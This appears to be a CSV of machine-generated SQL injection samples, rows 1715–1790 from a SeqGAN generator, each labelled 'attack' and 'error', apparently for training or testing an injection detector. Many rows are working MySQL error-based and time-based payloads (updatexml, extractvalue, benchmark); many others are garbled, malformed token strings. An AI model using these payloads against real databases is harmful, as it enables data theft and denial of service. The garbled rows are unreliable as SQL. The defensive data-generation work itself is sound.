attack,"1"" or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1715
attack,"1%' procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1716
attack,"1' and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and 'knn",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1717
attack,"1%"" or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1718
attack,"1%""   then 2162)    usselect   (  5464  =  (  (  7982,1   )    )  (  extractvalue  (  2917,md5  (  0x2e,0x7171706a71,  (  select   (  el  (  1808  =  (  0x5c,0x7171706a71,  (  benchmark  (  5000000(  (  0x2e,0x7171706a71,,  (  (  (  select   (  elt  (  e  1354  =  5603  (  select   (  5603  =  (  (  1808,1   )    )    AND R0x717a767a71  )  (  select   )    (  select   (  9393  =  1297,",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1719
attack,"1%'   and updatexml  (  (  (  (  3393,concat  (  (  (  0x2e,0x7171706a71,  (  selectbenchmark  (  1535  )   (  (  (  elt  (  1808  =  (  7982  =  (  (    (  (  (  3393,concat  (  (  (  =  3393,  (  (  select   (  elte  4774  =  (  (  case  =  (  0x4b774c75   end  (  )   SELECT dual  )  el  )  )   and updatexml  (  (  (  (  (  (  3393,0x717a767a71",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1720
attack,"1'=  3217  (  (  (  =  (  9255,concat  (  (  0x5c,mduan d5  (  0x2e,1  extractvalue  (  (  9627,mduant  (  1808  =  (  (  0x5c,0x7171706a71,0x717a767a71  (  select   (  el  (  3393  =  1759  (  (  (  5000000(  (  1808  =  (  3393,md5  (  3393  (  0x5c,  (  benchmark  (  (  (  select   (  elna  0x4b774c75   end  (  (  el  (  (  0x4b774c75 0 a",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1721
attack,"1%"" or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1722
attack,"1%"" where 4968 and updatexml  (  (  (  (  1808  =  (  (  0x5c,0x7171706a71,  (  (  (  (  (  (  (  (  5000000,md5  (  (  (  (  (  =  (  (  (  (  (  1808,concat  (  (  (  (  (  0x2e,0x7171706a71,  (  select   (  3539  =  (  1808,md5  (  (  select   (  e  (  elt  (  1808  =  (  (  0x2e,md5  (  0x2e,  (  select   (  elt",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1723
attack,"1%' and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1724
attack,1%%%'  =  ',error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1725
attack,"1%'  )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and   (  '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1726
attack,"1%""   and extractvalue  (  (  (  3393,concat  (  (  (  (  (  0x5c,0x7171706a71(  (   (  (  (  (  (  7050  (  (  (  (  0x2e,0x7171706a71,  (  select   (  l  (  (  (  0x2e,md5  (  (  (  (  0x2e,0x7171706a71(  (  (  5000000(  (  (  0x2e  =  7982,0x7171706a71,  (  (  benchmark  (  (  =  (  al_inadd50x7171706a71  (  (  elt  (  5000000,md5  (  (  0x2e,",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1727
attack,"1' and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and 'kppfudh9255(denal  )  e  =  (  (  0x5c,0x7171706a71,  (  (  select   (  elt  (   (  5433  (   from   (  (  elta  elt  (  e  3393  (  0x5c,0x7171706a71,  (  select   (  case 8375   6560 0 0 from d5  (  elt  elt  7982  =  (  1049  (  0x2e,0x7171706a71,  (  select   (  elt  (  0x5c,md5  (  elt  (  0x2e,0x7171706a71(  (  ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1728
attack,"1%"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1729
attack,"1%"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1730
attack,"1%""   )    AND and updatexml  (  (  (  (  (  (  0x2e,md5  (  (  0x2e,0x7171706a71,  (  5000000(  (  (  0x2e,0x7171706a71,  (  (  0x5c,0x7171706a71,  (  (  select   (  (  elt  (  e  (  1808  =  (  1297  =  7982,1   (  3539  (  and extractvalue  (  (  (  0x2e,md5  (  (  1808  =  (  (  (  0x2e,(  (  =  (  (  9255,,  (  (  select   (  (  el",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1731
attack,"1%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1732
attack,"1%'   )    )    AND SYS.FROM int  (  eltextractvalue  (  select 0 0 from d anal  )   (  (  eltadn  )  e  =  5777  (     (  (  5322  =  (  1808,md  (  (  0x5c,md5  (  (  0x2e,md,  (  select 38630 dual  )   SELECT fnal   (  9338  (  7982=  (  (  0x2e,0x7171706a71,  (  select   (  elt  (  1724  =  3393,",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1733
attack,"1',(  (  1808,concat  (  (  (  0x2e,md5  (  (  select   (  elt  (  elt  (  e  (  select   (  elt  (  elt  (  3393  =  (  1808,1   )    AND 'i'  =  extractvalue  (  9627,0x717a767a71  (  9083  (  select   (  el  (  7982  =  3393,  (  select   (  elt  (  e  (  0x2e,0x7171706a71,  (  select   (  1808,0x7171706a71,  (  select   (  elt  (  1808  =  5989",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1734
attack,1% pk'  =  'ciki,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1735
attack,"1%' procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1736
attack,"1%""   )    procede  (  8841  =  7636  (  9627,concat  (  (  0x5c,0x7171706a71,  (  5000000(  (  0x2e,0x7171706a71,  (  (  benchmark  (  (  (  select   (  elt  (  1297  =  (  (  (  7982  =  (  benchmark  (  (  (  5000000,md5  (  (  0x5c,  (  (  select   (  case when   (  (  elt  )  0x2e,0x7171706a71,  (  (  t  (  benchmark  (  (  5000000(  (  (  (  5777  ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1737
attack,"""   )    )    AND AND,1  (  8860  =  2162  =  9338  (  extractvalue  (  7982,1   )    AND cast  (  9627,mduan  )  2917  =  1759(  (  benchmark  (  (  3393,1   from duanal  )  )   end  (  (  elt  (  elt  (  1297  =  (  5000000  (  =  (  (  7982  =  (  3863  (  50000000x5c,  (  (  benchmark  (  (  (  t  (  benchmark  (  (  50000003393,md5",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1738
attack,"1%"" or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1739
attack,"1%"" procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1740
attack,"1%"" or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1741
attack,"1%""   )    us wwmxqFROMose anal  )  1297=  (  (  (  0x5c,  (  (  50000003393,concat  (  (  (  0x2e,0x7171706a71,  (  (  5000000,md5t  (  benchmark  (  (  e  (  select   (  case when   (  extractvalue  (  (  9627,concat  (  (  (  0x2e,0x7171706a71,  (  5000000(  (  0x2e,md5  (  0x5c,0x7171706a71,  (  select   (  (  elt  e  (  select   (  case when   (  (  ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1742
attack,"1%j'  =  '""5603'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1743
attack,"1%""   )    )    AND 1559  =  * or  extractvalue  (  1297,0x7171706a71,  (  5000000,md5  (  0x2e,0x717a767a71  (  select 1272  (  (  (  (  0x5c,0x7171706a71,  (  =  (  3393,  (  (  (  benchmark  (  (  select   (  elt  (  )  0x2e,0x7171706a71,  (  (  1759(  (  1808  =  8277  =  (  (  3393,concat  (  (  (  (  1 as adn  (  case when   (  (  (  l  )  1 when   ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1744
attack,"1' and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and 'kh8318"" like "") ' or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and 'tne  (  0x2e,0x7171706a71,  (  (  benchmark  (  (  (  benchmark  (  (  1297,concat  (  (  (  benchmark  (  (  5000000,md5  (  (  0x5c,0x7171706a71,  (  (  benchmark*(  1759  (  (  (  0x4b774c75   (  2914  =  (  (  3393,1   )    )     (  extractvalue  (  1808,concat  (  (  (  0x2e,md5  (  0x2e,0x7171706a71,  (  (  select   (  el  e  (  select   (  elt0 a  ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1745
attack,"1%"" or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1746
attack,"1%"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1747
attack,"1%' procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1748
attack,"1%""  )   and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and   (  ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1749
attack,"1%"" or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1750
attack,"1%""   )    AND 'i'  =  1   (  )  )  select 2518  (  (  (  (  (  1808,concat  (  (  3393,1   (  (  case when  (  1759  (  select   (  (  4415  =  ut  elt  )  0x5c,  (  (  (  select   (  eltl  (  0x4b774c75   end  (  (  case 0 0 from dua  elt 0   (  2917,0x7171706a71)  (  e  (  (  elt  (  2917    =  1   )    (  extractvalue  ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1751
attack,"1"" and extractvalue  (  (  3393,concat  (  (  (  0x2e,md5  (  0x2e,0x7171706a71,  (  (  5000000,md5  (  (  0x5c,0x7171706a71,  (  select   (  elt  (  elt  (  1759  =  (  1 a  )    8083  =  utl  (  case  )  select 0 from   (  (  ellt  (  elt  (  3393  =  (  1 or   (  )  (  (  (  elt  (  5000000,md5  (  (  0x4b774c75   end",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1752
attack,"1and updatexml  (  (  (  ' like 'dualyse analyse  (  5198  =  3393,  (  select   (  eld a  (  0x5c,0x7171706a71,  (  select   (  1049  =  (  (  0x5c,0x7171706a71,  (  (  t  (  select   (  elt  (  elt  (  5000000,m(  (  (  select   (  )   (  3539  (   from dua  (  elta  elt   (  6166  =  (  (  (  1808  =  8768  (  5000000,m",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1753
attack,"1%""   )    )    AND AND or  1 extractvalue  (  (  (  (  (   (  4660  (  (  (  (  0x5c,0x7171706a71,  (  0x5c,0x7171706a71,  (  (  0x5c,  (  (  (  =  (  (  5000000,md5  (  (  (  (  0x2e,0x7171706a71,  (  (  benchmark  (  (  (  (  (  (  (  benchmark  (  benchmark  (  (  (  benchmark  (  benchmark  (  2917,concat  (  =  (  0x2e,0x7171706a71,concat  (  (  (  (  =  (  (  ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1754
attack,"1"" or updatexml  (  (  (  (  (  (  (  0x2e,concat  (  0x2e,0x7171706a71,  (  (  (  5000000(  (  (  (  8862t=  (  0x2e,0x7171706a71,  (  select   (  (  elt  (  3393  =  (  5464  =  (  (  (  3393,1   from dual  )  e  )  7982  =  (  50000000x5c,0x7171706a71,  (  (  5000000,md5  (  0x2e,0x7171706a71,  (  (  5000000,md5  (  (  0x2e,0x7171706a71,  (  select   (  e",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1755
attack,"1%"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1756
attack,"1"" and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and ""y"" like ""gge' like 'n mnAmTvpw",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1757
attack,"1%'  )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and   (  '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1758
attack,"1%"" or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1759
attack,"1%"" and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1760
attack,"1%""  )   and extractvalue  (  (  (  5000000(  (  0x5c,0x7171706a715433  (  benchmark  (  (  1297,concat  (    (  (  0x2e,0x7171706a71(  (  =  (  (   (  )   (  (  elt  (  (  e  0x52515a50   end  (  1354  (  (  (  5000000,md5  (  select   (  elt  (  e  (  1297  =  (  3393,1   from d a from(   (  6804  (  (  5423  =  8862,md5  (  (  (  0x4b774c75   end  (",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1761
attack,"1%""  )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and   (  ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1762
attack,"1%""   and updatexml  (  (  3393,concat  (  0x2e,0x7171706a71,  (  (  (  (  (  benchmark  (  5000000(  (  0x2e,concat  (  (  1759(  0x2e,0x7171706a71,  (  5000000(  (  3393  (  0x2e,0x7171706a71,  (  select   (  (  elt  (  3576  =  (  1297,1   from dual  )   SELECT proceduedure analnall  e  )   SELECT drooileanalyseduree  (  e",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1763
attack,"1%""   )    (  *  =  't  (  case or updatexml  (  (  (  (  (  (  (  (  0x2e,0x7171706a71  (  (  (   (  select   (  (  elt  (  0x2e,(  (  (  0x52515a50   end  (  elt  (  3393,1   from dua  elt  (  elt  (  elt  (  0x2e,,md5  (  0x5c=  (  (  (  3393  =  (  (  0x2e,concat  (  (  (  select   (  e  (  e  5198  (",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1764
attack,1%%'  =  ',error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1765
attack,"1 and updatexml  (  (  (  (  (  (  (  (  0x2e,0x7171706a71,  (  5000000,md5  (  (  9255,concat  (  (  0x2e,0x7171706a71,  (  benchmark  (  (  (  9627,md5  (  0x2e,0x7171706a71,  (  select   (  (  elt  (  elt  (  5000000,updatexml  (  benchmark  (  (  5000000,md5  (  (  0x2e,0x7171706a71,  (  select   (  elt   (  elt  (  1808  =  (  (  (  3393  =  (  7744  (",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1766
attack,"1%"" 1354 extractvalue  (   (  (   (  3576  (  (  (  (  2917  (  (  (  0x2e,0x7171706a71,  (  benchmark  (  (  (  (  benchmark  (  (  ((  elt  (  benchmark  (  (  (  0x2e,0x7171706a71,  (  (  5000000(  (  0x2e,m5  (  (  0x5c,  (  (  5000000,md5  (  (  (  0x2e,0x7171706a71,  (  (  benchmark  (  (  select   (  elte  8375  =  (  1808,concat  (  0x5c,0x7171706a71,  (  select",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1767
attack,"1%' and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1768
attack,"1%"" or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and ""%'  =  'kbse du      l  (  0x5c,md5  (  (  0x5c,md5  (  (  0x4b774c75   end  (   (   (a  (  ell  (  9788  =  (  3393,md5  (  (  3393,1   (  case 0 from dual  el  )  )   end  (  (  elt  (  3393,  (  (  select   (  elt   (  (  elt  (  select   (  1724  (  1759,  (  (  0x2e,md5  (  1   from",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1769
attack,"1%'  )   and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and   (  '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1770
attack,"1"" or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and "" where an dut  elt  (  7982  =  (  select   (  el  (  2917  =  (  2917,concat  (  5322t  (  (  0x5c,0x7171706a71,  (  select   (  1808)   SELECT or from 0 from d5  (  lt  e  (  elt  (  e  (  3393  =  1808,1   (  select   (  5198  (  (  0x2e,0x7171706a71,  (  (  5000000(  (  1808,m,md5  (  0x2e,0x7171706a71,  (  select   (  elt  (  e",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1771
attack,"1%"" updatexml  (   SELECT 1559 (  (  1808  =  (  (  0x2e,0x7171706a71,  )  (  benchmark  (  t  (  (   (  4415  (  (  (  select   (  elt  (  eltt  1808  )  select   (  elt  case when   (  extractvalue  (  5000000,md5  (  (  0x2e,  (  select   (  case 0 0 from dual  )   end  (  (  case 0 0 from dual  )  e  )  5603   (  (  (  el  ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1772
attack,"1%""   )    AND 7997 extractvalue  (   (  (  (  elt  (  elt  (  0x2e,md5  (  0x2e,m(  (  (  =  (  (  9627,concatt  (  (  (  (  0x2e,0x717a767a71  (  select   (  (  elt  (  case  )  7982  =  (  0x2e,md5  (  benchmark  (  (  0x2e,0x7171706a71,  (  select   (  (  elt  (  elt  (  1808  =  =  (  (  3393,  (  (  0x2e,md5  (  ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1773
attack,"1%""  )   and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and   (  ""%""  =  ""u",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1774
attack,"1%' or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and '%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1775
attack,"1%""   )    )    (  9338select   (  updatexml  (  (  (  (  (  (  (  (  (  (  (  (  (  (  (  0x5c,0x7171706a71,  (  5000000(  (  (  (  (  (  (  (  (  (  0x5c,(  (  (  (  (  5000000,0x7171706a71(  (  (  benchmark  (  3393,concat  (  0x5c0x7171706a71,0x7171706a71,0x7171706a71(  (  (  0x5c,0x7171706a71,concat  (  (  (  (  (  (  select   (  e  )  5198  =  (  (  e  (  0x2e,0x7171706a71,",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1776
attack,"1%' procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1777
attack,"1%%"" or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1778
attack,"1%' or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1779
attack,1%1%'  =  ',error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1780
attack,"1%"" or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and ""%Ybn"" 3863 ancase 2914 5603   (  4415  (  (  1808,concat  (  (  (  0x2e,1   or extractvalue  (  (  (  (  0x5c,0x7171706a71,  (  select   (  e)  ual  )  )  )  )  =  1297,1   )    5  (  select   (  =  utl  )  1808,1   from d     (  elt  (  9788  =  3335  (  8862,1   )    AND 8083  =  1 0 d5 as annal  )   end  (",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1781
attack,1%%'  =  ',error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1782
attack,"1%1%' and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1783
attack,"1%""   )    )    FROMs 8860  =  (  9083  )  select 0 from dual  4688  )    =  (  7982  =  (  (  0x2e,(  (  (  0x2e,0x7171706a71,  (  select   (  case 0 0 from dua   (  3863  (  elt  )  elt  (  elt  (  eyta  )  ua  (  case when   (   (  (  1354  =  (  7982,1   )    (  extractvalue  (  (  3393,concat  (  =  (  1759(  5433",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1784
attack,"1%p' and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and 'i",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1785
attack,"1%""  )   and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and   (  ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1786
attack,"1%""   )    1559  (  select   (  6166  (  extractvalue  (  1 9103  (  (  (  (  (  (  et  (  e  (  0x4b774c75   7636  (  elt  (  1297  =  (  (  7982     (  2813  (  (  e  (  1808  =  (  select   (  5000000,0x7171706a71(  (  (  (  benchmark  ,  (  benchmark  (  5000000(  (  (  t  (  0x5c,0x7171706a71,  (  =  (  2917,concat  (  (  (  (  select   (  3393,1   )    (    (",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1787
attack,"1%' and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1788
attack,"1%' procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1789
attack,"1%"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1790
